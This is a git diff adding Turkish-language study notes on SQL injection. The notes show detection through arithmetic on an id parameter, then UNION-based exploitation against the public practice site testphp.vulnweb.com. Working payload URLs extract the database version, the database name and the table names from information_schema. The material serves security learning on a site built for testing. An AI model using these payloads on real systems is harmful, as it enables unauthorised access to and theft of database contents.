@@ -125,9 +125,9 @@ Veri tabanına mustafa samed isimli bir admin varsa mustafa samed+boşluk diyere
 
 ## **Pseudo Code**
 
+```
 www.x.com/?id=1
 
-```
 MDISEC
 
 ====================================
@@ -144,3 +144,135 @@ if result.size() > 0:
 else:
   print("haberler yok")
 ```
+
+Bu web uygulamasında aşağıdaki sorguyu çalıştırdığımı varsayalayım.
+
+```
+SELECT * FROM haberler WHERE id=1;
+```
+
+Çalışıp çalışmayacağını test etmek için benzer bir sorguyu kendi veri tabanımda deniyorum ve görüyorum ki çalışıyor ve çalışmak için tırnak işaretine ihtiyaç duymuyor.
+
+```
+MariaDB [TEST]> SELECT * FROM users WHERE id=1;
++----+---------------+-----------+-------+---------------------+
+| id | firstname     | lastname  | email | reg_date            |
++----+---------------+-----------+-------+---------------------+
+|  1 | mustafa samed | özşahin   | NULL  | 2025-06-28 18:35:56 |
++----+---------------+-----------+-------+---------------------+
+```
+
+```
+www.x.com/?id=1
+
+SELECT * FROM haberler WHERE id=1;
+
+<html>
+MDISEC
+</html>
+
+====================================
+
+www.x.com/?id=2
+
+SELECT * FROM haberler WHERE id=2;
+
+<html>
+LUNIZZ
+</html>
+
+====================================
+
+www.x.com/?id=2-1
+
+SELECT * FROM haberler WHERE id=2-1;
+
+<html>
+MDISEC
+</html>
+
+```
+
+Bu sorguyu çalıştırabiliyorsam veri tabanında çıkarma işlemi yapabildiğim anlamına gelir.
+
+```
+SELECT * FROM haberler WHERE id=2-1;
+```
+
+Sqli da dahil olmak üzere tüm zafiyetlerde dikkat edilmesi gereken 2 husus vardır.
+
+1-Zafiyet tespiti
+2-Zafiyet sömürüsü
+
+Eğer id parametresine 1 değerini veriyorsak MDISEC sonucunu site döndürür eğer 2 değerini veriyorsak LUNIZZ sonucunu site döndürür ve bunlar developer tarafından beklenen davranışlardır. Ama eğerki ben id parametresine 2-1 değerini verip id'nin 1 olduğu durum gerçekleşiyorsa bu, benim veri tabanında planladığım davranışı yaptırabildiğim anlamına gelir.
+
+Peki veri tabanına doğrudan erişimim olduğuna göre bunu nasıl sömüreceğim?
+
+Önceki sorgularda id parametresine müdahele edebiliyorum fakat sorgunun önceki kısımlarına müdahele edemiyorum yani o SELECT sorgusu çalışacak. O halde id'den sonraki kısımda UNION'ı kullanarak kendi sorgularımı yazabilirim.
+
+Deneme yapabileceğim web sitesi
+
+http://testphp.vulnweb.com/
+
+Siteye girdikten sonra categories->posters diyorum.
+
+![Image](https://github.com/user-attachments/assets/b41b5d27-44d7-4511-8061-59e9ded42579)
+
+Url kısmındaki cat değerine 2 yazarsam sayfa böyle oluyor.
+
+![Image](https://github.com/user-attachments/assets/59d0ffde-df29-422e-b7ff-3afa165ea1b5)
+
+Şimdi ise 2-1 giriyorum bu da demek oluyor ki veritabanına müdahalede bulunabiliyorum.
+
+![Image](https://github.com/user-attachments/assets/be512677-cb6d-4b2c-b5ab-ba09e536da18)
+
+UNION kullanarak başka bir SELECT sorgusuyla birleştirmeye çalışıyorum ve hata alıyorum çünkü birleştirmeye çalıştığım sorgular farklı sütun sayılarında sahip.
+
+![Image](https://github.com/user-attachments/assets/df14730f-d358-423a-a0fc-454dbec0f449)
+
+Sütun sayıları eşitlenene kadar deneme yapıyorum. cat değerinin 1 olduğu sayfa ile aynı sayfaya geliyorum ama bir farklılık var. Sayfanın sonunda bulunan 7,2,9 rakamları var. Bu rakamlar, benim sorgumdan önceki sorgudaki 7., 2., ve 9. indislerin ekrana yazdırılmasından dolayı gözüküyor. Bu indisleri kullanarak kendi helper fonksiyonlarımı yazdırabilirim.
+
+```
+http://testphp.vulnweb.com/listproducts.php?cat=1%20union%20select%201,2,3,4,5,6,7,8,9,10,11
+```
+
+![image](https://github.com/user-attachments/assets/715eb3a5-a0bc-4f70-abf2-fa8569aa92d2)
+![image](https://github.com/user-attachments/assets/c91db4f7-c676-4178-90d4-d5eed021d31b)
+
+7. indiste version() fonksiyonunu yazıyorum.
+
+```
+http://testphp.vulnweb.com/listproducts.php?cat=1%20union%20select%201,2,3,4,5,6,version(),8,9,10,11
+```
+
+![image](https://github.com/user-attachments/assets/a7db5988-32cd-422f-acac-35751cc91d21)
+
+id kısmına -99999 yazdım çünkü böyle bir id'ye sahip kullanıcı yok bu da sayfada sadece bizim istediğimiz değerlerin gözükmesini sağlar.
+
+```
+http://testphp.vulnweb.com/listproducts.php?cat=-99999%20union%20select%201,2,3,4,5,6,version(),8,9,10,11
+```
+
+![image](https://github.com/user-attachments/assets/196d9a3b-7ac2-419c-ac25-8d6980eb372b)
+
+Şimdi ise database bilgisini almak için url'de değişiklik yapıyorum.
+
+```
+http://testphp.vulnweb.com/listproducts.php?cat=-99999%20union%20select%201,2,3,4,5,6,database(),8,9,10,11
+```
+
+![image](https://github.com/user-attachments/assets/63aaf41b-7bdc-490f-a7d4-d78a9033ff4c)
+
+SELECT sonrası hangi tablodan veri çekeceğimi ve FROM'dan sonra neler yazabileceğimi bulmam lazım.
+
+Mysql workbench görünümü
+
+![image](https://github.com/user-attachments/assets/272758f2-ec7c-48be-acdb-f4e2f2a3f7af)
+
+Aşağıdaki sorgu tablo isimlerini elde etmemizi sağlar
+
+```
+http://testphp.vulnweb.com/listproducts.php?cat=-99999%20union%20select%201,2,3,4,5,6,table_name,8,9,10,11%20from%20information_schema.tables%20where%20table_schema%20=%20database()
+```
+
+![image](https://github.com/user-attachments/assets/1f81aa73-dfb7-414b-b6d2-b76635f56e42)
